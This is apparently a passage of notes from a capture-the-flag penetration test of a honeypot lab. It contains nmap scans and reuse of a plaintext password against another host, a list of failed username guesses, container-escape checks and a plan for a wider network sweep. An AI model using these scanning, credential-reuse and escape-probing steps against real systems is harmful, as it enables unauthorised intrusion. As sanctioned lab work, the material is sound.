$ sudo -n nmap -Pn -sS -T4 -p- 10.0.4.193
PORT   STATE SERVICE
22/tcp open  ssh
(all other 65534 ports closed/reset — a real, reachable host, not a firewall artifact)

$ nmap -sV -sC -p22 10.0.4.193
22/tcp open  ssh  OpenSSH 9.6p1 Ubuntu 3ubuntu13.18   <- different OS/SSH build than our own Debian box
```

Reused the known badger password against `.193`:

```
badger / 4LkbPt9qvNV6NZ76ooHArw  -> logs in successfully
root / admin / aegis / aegishive / hive / backup / deploy / ubuntu /
service / honeyvault / operator  -> all "Permission denied"
```

Logging into `badger@<gateway .193>` **drops you into another fresh
`hv-analyst-01` container** — same hostname, same MOTD, same sudoers file —
but on yet another random `/26` (confirmed subnets seen across independent
reconnects: `10.0.3.x`, `10.0.4.x`, `10.0.8.x`, `10.0.9.x`, each with a
*different* gateway that in turn also just answers with another decoy).

This is the "Honey" in HoneyVault: the local-network gateway of every
ephemeral container is, itself, just the Docker/Proxmox host's own sshd
auto-provisioning another disposable decoy analyst box on connect. It's
recursive — there is no "real" host reachable this way; you just keep
spawning more instances of the same image. Verified this isn't a fluke by
reconnecting to the *primary* public hostname 3 times too and seeing the same
subnet-randomization behavior (10.0.9.128/26, 10.0.9.64/26, 10.0.9.192/26 —
three different /26 blocks across 3 plain reconnects to the given creds).

No other ports (http/https/8080/3306/5432/6379/9090/27017/rsync/nfs/smb/etc.)
were ever found open anywhere in any scanned `/26`, on any host, across
several independent scans.

## Container escape — checked, all closed

```
CapEff (badger):        0000000000000000
CapEff (root via sudo):  00000000a80425fb   (limited bounding set, no CAP_SYS_ADMIN-class powers exercised successfully)
Seccomp: 2 (filter active)
dmesg / sudo dmesg -> "Operation not permitted" (blocked even as root)
/var/run/docker.sock -> does not exist
cgroup -> cgroup2, mounted read-only, nosuid,nodev,noexec (no release_agent escape)
/dev -> only null/zero/random/urandom/full/tty/console; no host block devices
```

No SUID/SGID binaries beyond stock Debian ones (`chfn`, `chsh`, `gpasswd`,
`mount`, `newgrp`, `passwd`, `su`, `umount`, `sudo`, `ssh-keysign`, `chage`,
`expiry`, `ssh-agent`, `unix_chkpwd`) — nothing custom, nothing exploitable
found.

## What's genuinely still open / next steps for a future session

1. The MOTD's "Internal network only" line implies there *should* be
   real internal infrastructure reachable from here — but every scan only
   ever finds the self-spawning decoy gateway. Possible avenues not yet tried:
   - A much wider IP sweep beyond the immediate `/26` (try adjacent `/24`s,
     e.g. `10.0.0.0/16` broadly) in case AegisHive sits on a fixed IP outside
     the per-connection ephemeral pool. Not attempted yet — a full `/16` sweep
     from inside one of these throwaway containers would take a while and
     risks just enumerating more decoys; worth trying with a fast top-port
     scan (`--top-ports 20 -T4 --min-rate 5000`) if resumed.
   - Check whether the CTF platform issued a *second*, distinct set of
     credentials/hostname specifically for an "AegisHive" component (the
     brief may assume access this session doesn't actually have — worth
     confirming with the task issuer / portal rather than re-guessing).
2. Never found any file, process, or network service anywhere that matches
   "AegisHive" by name or by described behavior (scheduled backup /
   integrity-check / cleanup). If it exists, it's outside every surface this
   badger identity can reach.
3. Confirmed (do not repeat): sudo NOPASSWD:ALL on this box is real but
   leads nowhere — no flag file exists in this ephemeral container's
   filesystem, and nothing external ever touches the container to give the
   "processing a user-writable file as root" bug a target to inject into.

## Tooling note for next session

The `ForceCommand`-wrapped sshd means all commands must go through an
interactive PTY (`expect`, not `ssh host 'cmd'`). Working harness left in
scratchpad (`run2.exp` pattern: log in interactively, `stty -echo` +
custom `PS1`, then per-command sentinel tokens like `echo TOKEN_N` and
`expect -re "\nTOKEN_N"` — must anchor on `\n` before the token or you'll
match the shell's own echo of the command line instead of its real output).
